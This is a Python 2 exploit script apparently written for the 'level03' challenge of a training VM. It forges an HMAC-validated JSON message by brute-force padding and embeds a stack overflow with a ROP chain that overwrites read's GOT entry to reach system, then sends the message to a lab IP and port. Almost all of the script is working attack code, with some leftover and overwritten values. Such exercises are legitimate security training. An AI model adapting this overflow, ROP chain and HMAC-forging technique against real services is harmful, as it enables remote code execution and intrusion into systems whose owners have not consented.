#!/usr/bin/python
import struct
import sys
import core
import time
import hmac
import hashlib
import json


'''
shell pgrep level03
shell cat /proc/pid/maps
ropgadget: usage: python ./ropgadget.py --binary level03 | grep pop
'''

#0x08049b4f : pop eax ; add esp, 0x5c ; ret
#0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
#0x0804964f : pop edi ; ret
POP_EAX = struct.pack('<I', 0x08049b4f)
ADD_EBX = struct.pack('<I', 0x080493fe)
POP_RET = struct.pack('<I', 0x0804964f)


READ_AT_PLT = struct.pack('<I', 0x08048db0)
READ_JUMP_SLOT = 0x804bd38
SYSTEM_OFFSET_FROM_READ = 0x84720
SYSTEM = struct.pack("<I", 0xb73ffb20)
GTITLE = struct.pack("<I", 0x804be04)
GCONTENTS_HEAP = struct.pack("<I", 0x95f6758)
GCONTENTS_HEAP = struct.pack("<I", 0x95f6741)

def generate_collision(token, json_string):
    loop_cnt = 0
    padded_msg = ''
    while True:
        new_json_string = json_string[0:-1] + ', "pad": %s}' % loop_cnt
        #json.loads(new_json_string)
        padded_msg = str(token)
        padded_msg += "\n"
        padded_msg += str(new_json_string)
        hmac_digest = hmac.new(token, padded_msg, hashlib.sha1).digest()
        result_or = ord(hmac_digest[0]) | ord(hmac_digest[1])
        if result_or == 0:
            break
        loop_cnt += 1
    return padded_msg

def main(fd):
    token = core.rx_until(fd, "\n")
    #token = token.replace("\"", "")[:-1]  #strip newline
    token = json.loads(token)
    print "Token: {0}".format(token)
    EBX = struct.pack('<I', (READ_JUMP_SLOT - 0x5d5b04c4) & 0xffffffff)
    EBX = struct.pack("<I", 0xaaa9b874)
    EBP = 'CCCC'
    ESI = 'ESII'
    EDI = 'EDII'
    EIP = 'AAAA'
    EIP = struct.pack("<I",0x080493fe)
    CONTENTS = 'FFFF'


    BUF = ''.ljust(127, 'A') + '\\\uAAAA'
    BUF += 'AAAABBBBCCCCDDD' + EBX + ESI + EDI + EBP
    # Set Up EAX with our offset for the next step
    BUF += EIP
    SUBoff = 0x4f960
    ADDoff = 0xb745d8e0 # take plt read value and add 0xf*8 + 1 to get the ADDoff
    # change added offset of ebx by: 0x5d5b04c4 
    # 0x080493fe : add dword ptr [ebx + 0x5d5b04c4], eax ; ret
    # 0xaaa9b874 is ebx
    # eax should be located at ADDoff

    # 0x08049b4f is eip
    # 0x08049b4f : pop eax ; add esp, 0x5c ; ret






    json_string = '{"contents": "%s", "serverip": "192.168.56.101:6969", "tags": ["AAAA", "BBBB"], "title": "' % CONTENTS + BUF +'"}'

    start_t = time.time()
    msg = generate_collision(token, json_string)
    print "Elapsed Time: {0}s".format(time.time()-start_t)
    raw_input('GO?')


    fd.send(msg)
    print "Msg: {0}".format(msg)
    print "Note that sockets have been disconnected!"


if __name__ == "__main__":
    if len(sys.argv) > 2:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    else:
        print "Assigning default IP/PORT"
        ip = "192.168.44.137"
        port = 20003
    fd = core.attach(ip, port, wait=False)
    main(fd)
